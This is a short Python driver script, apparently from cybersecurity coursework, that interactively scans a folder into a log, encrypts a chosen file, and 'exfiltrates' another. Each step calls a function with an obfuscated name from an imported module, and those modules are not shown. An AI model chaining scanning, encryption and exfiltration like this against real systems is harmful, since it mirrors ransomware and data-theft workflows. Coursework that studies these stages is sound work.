from task1_obs import X99
from task2_obs import _3M
from send_obs import _ex
import os

def main():
    # 1️⃣ Ask user for folder to scan
    print("[?] What folder do you want to scan?: ", end='')
    zT78 = input().strip()

    if not os.path.isdir(zT78):
        print("[ERROR] Invalid folder path.")
        return

    # 2️⃣ Automatically save log file in fixed path
    output_dir = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'coursework-cyber fund')
    os.makedirs(output_dir, exist_ok=True)
    log_path = os.path.join(output_dir, "file.log")
    print(f"[*] Scanning... Log will be saved at: {log_path}")
    X99(zT78, log_path)

    if not os.path.exists(log_path):
        print(f"[ERROR] Log file not created at: {log_path}")
        return

    print(f"[✓] Log saved at: {log_path}")

    # 3️⃣ Ask user which file to encrypt
    print("[?] What file do you want to encrypt?: ", end='')
    file_to_encrypt = input().strip()

    if not os.path.isfile(file_to_encrypt):
        print("[ERROR] File to encrypt not found.")
        return

    key_path = os.path.join(output_dir, "key.bin")
    _3M(file_to_encrypt, key_path)
    print(f"[✓] File encrypted. Key saved at: {key_path}")

    # 4️⃣ Ask user which file to exfiltrate
    print("[?] What file do you want to exfiltrate?: ", end='')
    file_to_exfiltrate = input().strip()

    if not os.path.isfile(file_to_exfiltrate):
        print("[ERROR] File to exfiltrate not found.")
        return

    _ex(file_to_exfiltrate)
    print("[✓] File exfiltrated.")

if __name__ == "__main__":
    main()
